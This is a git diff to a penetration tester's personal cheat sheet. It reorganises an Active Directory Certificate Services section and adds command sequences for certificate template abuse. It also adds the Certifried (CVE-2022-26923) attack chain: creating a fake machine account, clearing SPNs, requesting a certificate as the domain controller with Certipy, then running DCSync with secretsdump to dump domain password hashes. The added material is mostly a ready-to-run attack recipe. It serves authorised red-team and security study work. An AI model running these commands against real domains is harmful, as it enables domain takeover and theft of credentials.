@@ -71,7 +71,10 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [HiveNightmare](#hivenightmare)
 * **[PrintNightmare](#printnightmare)**
 * **[noPac](#nopac)**
-* **[PKI Abuse](#pki-abuse)**
+* **[Active Directory Certificate Service](#ADCS)**
+	* [PKI Abuse](#pki-abuse)
+	* [ESC8](#esc8)
+	* [Machine Account dnsHostName confusion](#machine-account-dnshostname-confusion)
 * **[Relay Notes](#relay-notes)**
 * **[File Transfer](#file-transfer)**
 * **[Reverse Shells](#reverse-shells)**
@@ -762,14 +765,16 @@ net computer \\FakeComputer /delete
 ### Reference 
 https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing
 
-## PKI Abuse
+## ADCS
+
+### PKI Abuse
 It is recommended to use below commands with `-k` option and .cacche file. Please refer [Request TGT](#request-tgt) section
 
-### Enumerate CA(s) on the domain
+1. Enumerate CA(s) on the domain
 ```
 python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --class ca
 ```
-### Enumerate for vulnerable templates
+2. Enumerate for vulnerable templates
 ```
 # Windows
 Certify.exe find /clientauth
@@ -777,7 +782,7 @@ Certify.exe find /clientauth
 # Linux
 python3 certi.py list '<domain>/<username>' -k -n --dc-ip <dc-ip> --vuln --enable
 ```
-### Request cert from CA
+3. Request cert from CA
 ```
 # Windows
 Certify.exe request /ca:dc.legitcorp.local\CA01 /template:vuln-template
@@ -785,7 +790,7 @@ Certify.exe request /ca:dc.legitcorp.local\CA01 /template:vuln-template
 # Linux
 python3 certi.py req '<domain>/<username>@<ca-server>' <ca-service-name> -k -n --dc-ip <dc-ip> --template <vuln-template> --alt-name <target-domain-account>
 ```
-### Retrieve TGT by using the certificate
+4. Retrieve TGT by using the certificate
 ```
 # Windows
 Rubeus.exe asktgt /user:lowpriv /certificate:cert.pfc /password:P@$$w0rd
@@ -793,13 +798,52 @@ Rubeus.exe asktgt /user:lowpriv /certificate:cert.pfc /password:P@$$w0rd
 # Linux
 python3 gettgtpkinit.py <domain>/<username> -cert-pfx <pfx-certificate-file> -pfx-pass <certificate-password> admin_tgt.ccache   
 ```
-### Retrieve NTLM hash (optional)
+5. Retrieve NTLM hash (optional)
 At this point, you can either use environment variable `KRB5CCNAME` to be used with ccache file or you can either get ntlm hash from the ticket with the following Commands
 ```
 python3 getnthash.py -key <AS-REP-encryption-key> -dc-ip <dc-ip> <domain>/<username> output_tgt.ccache
 ```
 
 For detailed example, you may refer to this awesome [gist](!https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250) by [@Flangvik](!https://twitter.com/Flangvik)
+
+### ESC8
+
+_Coming Soon_
+
+### Machine Account dnsHostName confusion
+
+**User** template certificate would identify and distinguish the certificate with the User Principal Name(UPN) of the certificate as _SubjectAltRequireUpn_ is in the `msPKI-Certificate-Name-Flag` attributes. However, **Machine** template distinguish computer accounts' certificates only by `dnsHostName` attribute which can be edited out and cause confusion in the KDC and attacker can request certificate as DC instead of the legitimate computer and results in a [DCSync](#dcsync) attack.
+
+1. Add a fake computer account with [PowerMad](https://github.com/Kevin-Robertson/Powermad) or [addcomputer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py)
+```
+# Powermad
+New-MachineAccount -MachineAccount 'FakeComputer' -Password (ConvertTo-SecureString -AsPlainText -Force 'Password123') -Domain domain.local -DomainController dc.domain.local -Verbose
+
+# impacket
+addcomputer.py domain.local/john:'Passw0rd1' -method LDAPS -computer-name 'JOHNPC' -computer-pass 'Password123'
+```
+
+2. Clear the SPNs attributes that relates to the current `dnsHostName` attribute.
+```
+addspn.py --clear -t 'FakeComputer$' -u 'domain\user' -p 'password' 'DC.domain.local'
+```
+
+3. Request certificate with [Certipy]()
+```
+certipy req domain.local/FakeComputer\$:Password123@dc.domain.local -ca DOMAIN-DC-CA -template Machine
+```
+
+4. Authenticate with the requested certificate earlier
+```
+certipy auth -pfx dc.pfx -dc-ip 10.10.10.10
+```
+
+5. [DCSync](#dcsync) and win
+```
+secretsdump.py domain.local/dc01\$@10.10.10.10 -just-dc -hashes :000000000000000
+```
+
+For the details explanation of the vulnerability (CVE-2022-26923), you may read the full article [here](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
 
 ## Relay Notes
 ![Relay Roadmap](./src/relay_list.png)
